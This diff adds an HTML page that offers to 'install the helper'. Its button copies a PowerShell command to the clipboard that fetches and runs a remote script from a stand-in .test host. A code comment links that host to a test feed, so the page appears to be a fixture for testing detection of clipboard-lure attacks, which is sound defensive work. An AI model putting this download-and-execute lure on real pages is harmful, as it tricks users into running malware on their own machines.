@@ -1,0 +1,23 @@
+<!doctype html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <title>Tools</title>
+  </head>
+  <body>
+    <p>Install the helper.</p>
+    <button id="go">Get it</button>
+    <script>
+      // Borderline on its own, the download address is in the test feed.
+      const payload = 'powershell -c "irm http://payload-reported.test:47123/a.ps1 | iex"';
+      document.getElementById('go').addEventListener('click', async () => {
+        try {
+          await navigator.clipboard.writeText(payload);
+          document.title = 'written';
+        } catch (e) {
+          document.title = 'error ' + e;
+        }
+      });
+    </script>
+  </body>
+</html>
